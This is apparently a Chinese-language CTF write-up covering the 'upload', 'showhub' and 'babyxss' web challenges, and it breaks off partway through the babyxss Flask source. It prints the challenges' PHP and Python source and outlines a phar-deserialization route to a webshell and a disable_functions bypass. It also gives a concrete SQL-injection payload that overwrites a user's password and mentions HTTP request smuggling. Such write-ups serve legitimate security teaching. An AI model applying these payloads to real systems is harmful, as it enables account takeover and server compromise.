 SID                                         </span><br><span class="line">================ ============================================</span><br><span class="line">172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                             Type             SID          Attributes                                        </span><br><span class="line">====================================== ================ ============ ==================================================</span><br><span class="line">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">&quot;upload/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">&quot;upload/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]) || preg_match(<span class="string">&quot;/file|php/i&quot;</span>,<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="keyword">$this</span>-&gt;filename,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$num</span> = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$num</span> = count(scandir(<span class="variable">$dir</span>)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you have <span class="subst">$num</span> files&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you don&#x27;t have file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">&quot; &quot;</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> dir(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;count&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;count(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;count(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>webroot in /var/www/html<br>Notice:scanner is useless<br>hint1: webroot changes every 10 mins<br>hint2: glob<br>hint3: <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.oop5.decon.php">https://www.php.net/manual/en/language.oop5.decon.php</a>  ** Pay attention to the notes in the article **</p>
</blockquote>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>upload处url可控,所以只要上传一个phar文件便可以反序列化</p>
<p>利用这个能做到:</p>
<ol>
<li>扫目录<code>__destruct__=&gt;__toString__</code></li>
<li>任意位置写文件,但是因为上传phar文件时有过滤,所以文件内容也有所限制</li>
</ol>
<p>但是</p>
<p><code>phar://phar.phar.gz/test.txt</code></p>
<p><code>将phar文件压缩后便可以绕过文件限制</code></p>
<p>于是我们就可以在任意位置写文件的权限了</p>
<p>于是我们有这样的思路:利用upload写一个htaccess,然后再利用反序列化写一个shell。</p>
<p>这里有个坑点就是，web主目录每隔10分钟变化一次,但是我们仍然可以利用反序列化来读取web目录</p>
<p>按照上述步骤成功拿到shell</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg" alt="image.png"></p>
<p>输入phpinfo()发现,有disable_function里禁用了system等函数,这就不爽了。但是php版本是7.2，上传</p>
<p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">https://github.com/mm0r1/exploits</a>  这个老兄写的绕过disable_function的脚本，爽死了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg" alt="image.png"></p>
<h3 id="showhub"><a href="#showhub" class="headerlink" title="showhub"></a>showhub</h3><p>阅读代码发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$password</span> = hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$user</span> = (<span class="keyword">new</span> User(<span class="literal">null</span>, <span class="variable">$username</span>, <span class="variable">$password</span>))-&gt;save();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>] = <span class="variable">$user</span>-&gt;id;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$args</span> = get_object_vars(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="variable">$args</span> = array_slice(<span class="variable">$args</span>, <span class="number">0</span>, -<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$args</span>[<span class="string">&#x27;id&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$baseSql</span> = <span class="string">&quot;UPDATE `<span class="subst">$this</span>-&gt;tbname` SET %s WHERE id=&quot;</span> . <span class="variable">$args</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$sql</span> = <span class="built_in">self</span>::prepareUpdate(<span class="variable">$baseSql</span>, array_slice(<span class="variable">$args</span>, <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;db-&gt;conn-&gt;error) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$baseSql</span> = <span class="string">&quot;INSERT INTO `<span class="subst">$this</span>-&gt;tbname`(%s) VALUE(%s)&quot;</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="built_in">self</span>::prepareInsert(<span class="variable">$baseSql</span>, <span class="variable">$args</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;db-&gt;conn-&gt;error) &#123;</span><br><span class="line">                <span class="variable">$objectID</span> = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">&quot;SELECT LAST_INSERT_ID()&quot;</span>)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">self</span>::findOne(<span class="keyword">array</span>(<span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$objectID</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>register调用的save方法存在格式化字符串漏洞可以绕过addslashes</p>
<p>构造<code>user=admin%1$&#39;,0x60)#&amp;pass=123</code></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9l4a1jb20j30l204cgls.jpg" alt="image.png"></p>
<p>insert 的一个方法可以修改重复的值  <code>insert on duplicate key update</code> ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。 </p>
<p>测试test用户,原密码:123</p>
<p>构造<code>user=test%1$&#39;,0x60)on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#&amp;pass=123</code></p>
<p>成功将密码修改为123456，冲admin密码</p>
<p>接着进入webconsole当中,提示只有内网才能使用</p>
<p>相关代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;request-&gt;user-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; !filter_var(</span><br><span class="line">                <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>],</span><br><span class="line">                FILTER_VALIDATE_IP,</span><br><span class="line">                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE</span><br><span class="line">            ))</span><br></pre></td></tr></table></figure>

<p>emmm直接修改cilent-ip发现不行</p>
<blockquote>
<p>因为这里的<code>Client-IP</code>头是反代层面设置的（set $Client-IP $remote_addr）, 所以无法通过前端修改请求头来伪造。 </p>
<p>这时可以从服务器返回的<code>Server</code>头中发现，反代是<code>ATS7.1.2</code> 那么应该很敏感的想到通过<code>HTTP走私</code> 来绕过反代，规避反代设置<code>Client-IP</code>。 </p>
</blockquote>
<p>那么什么是ast?</p>
<blockquote>
<p>Apache Traffic Server™ is a high-performance web proxy cache that improves network efficiency and performance by caching frequently-accessed information at the edge of the network. This brings content physically closer to end users, while enabling faster delivery and reduced bandwidth use. Traffic Server is designed to improve content delivery for enterprises, Internet service providers (ISPs), backbone providers, and large intranets by maximizing existing and available bandwidth. </p>
</blockquote>
<p>emmmm,ast是一个在用户和服务器之间的起缓冲加速的代理服务器,这也正是http走私常出现的应用场景</p>
<p><code>ATS7.1.2</code> 有个cve恰好是关于http走私的，直接用就ok了</p>
<h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>emmm,ctf的弥天大谎</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, session, request, make_response</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;somesecret&#x27;</span></span><br><span class="line">config = json.load(<span class="built_in">open</span>(<span class="string">&#x27;config.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    base = <span class="string">&#x27;https://&#x27;</span>+request.host</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(url) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(url) &lt; <span class="built_in">len</span>(base) <span class="keyword">or</span> url[:<span class="built_in">len</span>(base)] != base:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_captcha</span>(<span class="params">captcha</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;captcha&#x27;</span> <span class="keyword">in</span> session.keys() \</span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">len</span>(session.get(<span class="string">&#x27;captcha&#x27;</span>)) == <span class="number">5</span> \</span><br><span class="line">        <span class="keyword">and</span> hashlib.md5(captcha.encode()).hexdigest()[:<span class="number">5</span>] == session.get(<span class="string">&#x27;captcha&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_queue</span>(<span class="params">url</span>):</span></span><br><span class="line">    q = Queue(connection=Redis(</span><br><span class="line">        host=config[<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;host&#x27;</span>],</span><br><span class="line">        password=config[<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;auth&#x27;</span>]</span><br><span class="line">    ))</span><br><span class="line">    q.enqueue(<span class="string">&#x27;bot.add&#x27;</span>, url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.php&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;captcha&#x27;</span> <span class="keyword">in</span> request.form.keys() <span class="keyword">and</span> <span class="string">&#x27;url&#x27;</span> <span class="keyword">in</span> request.form.keys():</span><br><span class="line">                captcha = request.form[<span class="string">&#x27;captcha&#x27;</span>]</span><br><span class="line">                url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> verify_captcha(captcha):</span><br><span class="line">                    message = <span class="string">&quot;Wrong Captcha :(&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="keyword">not</span> verify_url(url):</span><br><span class="line">                    message = <span class="string">&quot;Wrong URL :(&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    session.pop(<span class="string">&#x27;captcha&#x27;</span>)</span><br><span class="line">                    message = <span class="string">&quot;Done! Please wait for the admin to check it out. XD&quot;</span></span><br><span class="line">                    add_queue(url)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Error! Please contact admin&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;captcha&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.form.keys() <span class="keyword">or</span> <span class="string">&#x27;captcha&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session.keys():</span><br><span class="line">        session[<span class="string">&#x27;captcha&#x27;</span>] = hashlib.md5(os.urandom(<span class="number">16</span>)).hexdigest()[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(</span><br><span class="line">        index,</span><br><span class="line">        message=message,</span><br><span class="line">        host=<span class="string">&#x27;https://&#x27;</span>+request.host,</span><br><span class="line">        captcha=session[<span class="string">&#x27;captcha&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fd.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mirror</span>():</span></span><br><span class="line">    response = make_response(request.args.get(<span class="string">&#x27;q&#x27;</span>))</span><br><span class="line">    response.headers[<span 